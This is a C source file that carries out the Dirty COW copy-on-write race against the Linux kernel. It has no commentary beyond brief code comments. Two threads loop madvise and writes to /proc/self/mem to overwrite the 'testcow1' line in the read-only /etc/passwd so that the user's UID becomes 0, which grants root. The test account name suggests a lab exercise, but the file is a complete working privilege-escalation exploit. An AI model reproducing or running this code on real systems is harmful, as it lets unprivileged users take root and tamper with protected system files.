#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/stat.h>
#include <pthread.h>
void *map;

void *writeThread(void *arg)
{
	char *content = "testcow1:x:0000";
	off_t offset = (off_t) arg;
	int f = open("/proc/self/mem", O_RDWR);
	while(1)
	{
		//Move fileptr to coressponding position
		lseek(f, offset, SEEK_SET);
		//Write to mem
		write(f, content, strlen(content));
	}
}	

void *madviseThread(void *arg)
{
	int file_size = (int) arg;
	while(1)
	{
		madvise(map, file_size, MADV_DONTNEED);
	}
}

int main(){
	pthread_t pth1, pth2;
	struct stat st;
	int file_size;

	// Open target file
	int f=open("/etc/passwd",O_RDONLY);

	//Map file to COW
	fstat(f, &st);
	file_size = st.st_size;
	map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
	
	//find the pos of target area
	char *position = strstr(map, "testcow1:x:1002");
	pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
	pthread_create(&pth2, NULL, writeThread, position);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	return 0;
}
